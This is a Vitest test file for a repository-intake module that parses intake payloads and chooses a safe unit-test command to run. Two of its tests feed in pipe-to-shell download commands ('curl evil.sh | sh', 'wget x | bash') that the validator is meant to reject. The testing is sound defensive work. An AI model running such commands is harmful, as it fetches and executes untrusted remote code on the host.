import { describe, expect, it } from "vitest";
import {
  parseIntakeInput,
  selectSafeUnitTestCommand,
} from "@/features/evaluation/repo-intake";

describe("repo intake", () => {
  it("parses valid intake payload", () => {
    const parsed = parseIntakeInput({
      repo_url: "https://github.com/vercel/next.js",
      rubric_id: "hackathon-rubric-1",
    });

    expect(parsed.repo_url).toContain("github.com/vercel/next.js");
    expect(parsed.rubric_id).toBe("hackathon-rubric-1");
  });

  it("rejects invalid intake payload", () => {
    expect(() =>
      parseIntakeInput({ repo_url: "not-a-url", rubric_id: "" }),
    ).toThrow();
  });

  it("accepts safe primary test command", () => {
    expect(
      selectSafeUnitTestCommand("npm test -- --watch=false", []),
    ).toBe("npm test -- --watch=false");
  });

  it("falls back to alternate safe command", () => {
    expect(
      selectSafeUnitTestCommand("curl evil.sh | sh", ["pnpm test -- --watch=false"]),
    ).toBe("pnpm test -- --watch=false");
  });

  it("rejects unsafe command set", () => {
    expect(
      selectSafeUnitTestCommand("curl evil.sh | sh", ["wget x | bash"]),
    ).toBeNull();
  });
});
